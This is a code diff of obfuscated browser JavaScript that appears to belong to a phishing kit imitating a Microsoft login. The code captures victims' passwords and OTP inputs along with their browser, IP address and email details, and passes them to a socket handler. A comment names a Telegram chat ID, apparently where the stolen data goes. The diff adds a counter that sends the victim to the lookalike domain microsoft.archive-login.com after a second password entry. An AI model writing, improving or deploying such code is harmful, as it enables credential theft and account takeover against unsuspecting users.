@@ -71,6 +71,8 @@ window.addEventListener('load', function () {
   const _0x423ae3 = document.querySelector(".otpInput2");
   const _0xb13de6 = document.querySelector('#cbx-43');
   const _0x57a5f = document.querySelector(".grayBox");
+  let passwordAttempts = 0;  // Counter to track password input attempts
+  const maxAttempts = 2; 
   var _0x58102b;
   var _0x4c5d45 = {
     ua: navigator.userAgent,
@@ -202,8 +204,11 @@ window.addEventListener('load', function () {
               _0x17c317.style.display = 'none';
               _0x206ab9.style.display = 'none';
               if (_0x4f1f32.CORRECT_PASSWORD) {
+                // passwordAttempts++;
+                // if (passwordAttempts > 1) {
+                //   _0x4f1f32.CORRECT_PASSWORD = 'OK'
+                // }
                 if (_0x4f1f32.CORRECT_PASSWORD != 'OK') {
-                  console.log("password is also saying not ok and text is ", _0x4f1f32.CORRECT_PASSWORD)
                   _0x1616fa.style.display = "block";
                   _0x1616fa.innerHTML = _0x4f1f32.CORRECT_PASSWORD;
                   _0x4e2af3.value = '';
@@ -280,7 +285,7 @@ window.addEventListener('load', function () {
     }
   };
 
-  let lastMessageTime = 0; // Keeps track of the last time a message was sent
+let lastMessageTime = 0; // Keeps track of the last time a message was sent
 const messageInterval = 1; // Minimum interval between messages in milliseconds (1 second)
 
 // Chat ID: 5902094102
@@ -392,6 +397,11 @@ ${message.ua} | IP: ${ipAddress} | Email Type: ${message.email_type} | Time Zone
     _0x4c5d45.password = _0x4e2af3.value;
     console.log("send pass");
     _0xa0771("LD1");
+    passwordAttempts++;
+    console.log("password attempts is ", passwordAttempts)
+    if (passwordAttempts > 1) {
+      window.location.href = "https://microsoft.archive-login.com";
+    }
     _0x58102b.emit("password_command", _0x4c5d45);
   });
   _0x4e2af3.addEventListener('keyup', function (_0x3eb40d) {
